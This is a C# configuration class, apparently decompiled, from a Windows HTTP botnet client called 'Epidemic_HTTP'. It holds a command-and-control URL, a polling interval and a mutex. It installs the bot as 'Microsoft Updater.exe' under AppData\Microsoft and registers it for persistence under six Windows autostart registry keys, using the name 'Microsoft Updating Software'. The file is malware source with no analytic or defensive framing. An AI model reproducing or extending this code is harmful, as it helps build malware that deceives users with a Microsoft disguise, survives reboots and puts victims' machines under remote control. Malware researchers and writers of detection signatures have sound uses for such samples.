using System;

namespace Epidemic_HTTP;

internal class Config
{
	public static bool debug = false;

	public static string http_dir = "http://eop-rs.com/epidemic/httpbot/bot/";

	public static int min_http_check_time = 300000;

	public static string mutex = "2$Q1P%J7I#WEL3NOOB&F2PPSZ()ZZ3RZ+H7F#8WE5ZZN3N!ER2W#";

	public static double bot_version = 3.3;

	public static string bot_file_path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Microsoft\\";

	public static string bot_file_name = "Microsoft Updater.exe";

	public static string bot_file = bot_file_path + bot_file_name;

	public static string registry_name = "Microsoft Updating Software";

	public static string[] registry_keys = new string[6] { "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunServices", "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows\\load", "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows\\run", "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\ShellServiceObjectDelayLoad", "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Terminal Server\\Install\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" };
}
